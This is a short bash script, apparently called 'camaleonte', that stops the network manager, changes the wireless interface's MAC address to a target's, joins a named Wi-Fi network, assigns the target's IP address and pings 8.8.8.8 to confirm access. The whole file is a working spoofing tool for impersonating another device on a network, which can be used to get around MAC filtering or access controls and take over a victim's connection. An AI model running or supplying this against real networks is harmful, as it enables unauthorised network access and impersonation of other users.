#!/bin/bash
#Usage: camaleonte iface wifi target gateway
#Requires arping of iputils package
if [ $# -lt 4 -o $EUID -ne 0 ]; then 
	echo "[!] Usage: "$0" iface_name wifi_name target_ip target_mac"
	echo "[!] Need to be root ! "
	exit 1
fi

mac=$4
ip=$3
ap=$2
iface=$1

echo "[+] lets spoof $mac,$ip"

service network-manager stop
sleep 1

ifconfig $iface down

macchanger $iface -m $mac
iwconfig $iface essid $ap
ifconfig $iface $ip

echo '[+] tryin to ping google.com ...'
ping 8.8.8.8 -c 4 -w 3
echo '[+] Bless..'
exit 0
